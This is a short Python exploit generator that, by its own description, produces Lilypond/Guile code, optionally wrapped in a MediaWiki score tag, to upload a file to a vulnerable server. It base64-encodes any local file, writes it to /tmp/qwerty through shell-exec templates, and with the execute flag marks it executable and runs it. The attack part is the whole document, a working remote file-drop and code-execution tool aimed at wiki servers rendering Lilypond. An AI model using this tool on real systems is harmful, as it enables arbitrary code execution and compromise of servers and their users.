#!/usr/bin/env python3

import os
import base64
import argparse

template_dir = os.path.join(os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__))), 'templates')

def add_from_template(lines, template):
  with open(os.path.join(template_dir, template), 'r') as template:
    for l in template:
      if l.lstrip().startswith(';'):
        continue  # skip comments
      lines.append(l)


p = argparse.ArgumentParser(description='Generate Lilypond/Guile/MediaWiki code to upload file to a vulnerable server')
p.add_argument('file', help='path to file')
p.add_argument('-f', '--format', help='output format', choices=['scm', 'ly', 'wiki'], default='scm')
p.add_argument('-e', '--execute', help='execute file after uploading', action='store_true')
a = p.parse_args()

lines = []
with open(a.file, "rb") as infile:
  lines.append('(define cmd "echo ' + base64.b64encode(infile.read()).decode('ascii') + ' > /tmp/qwerty")')
  add_from_template(lines, 'shell_exec_blind.scm')
  if a.execute:
    lines.append('(define shellcmd "chmod +x /tmp/qwerty; /tmp/qwerty")')
    lines.append('(define shellout "/tmp/asdf")')
    lines.append('(define inputfilename "/tmp/asdf")')
    add_from_template(lines, 'shell_exec_to_file.scm')
    add_from_template(lines, 'read_file.scm')
  else:
    lines.append('(define s "Hello, world!")')

prefix = '#' if a.format != 'scm' else ''
if a.format == 'wiki':
  print('{{Image frame|content=<score vorbis="1" lang="lilypond">')
for l in lines:
  print(prefix+l.strip())
if a.format != 'scm':
  print("\\score {\\new Staff <<{g^#s")
  print("}>>}")
if a.format == 'wiki':
  print('</score>}}')
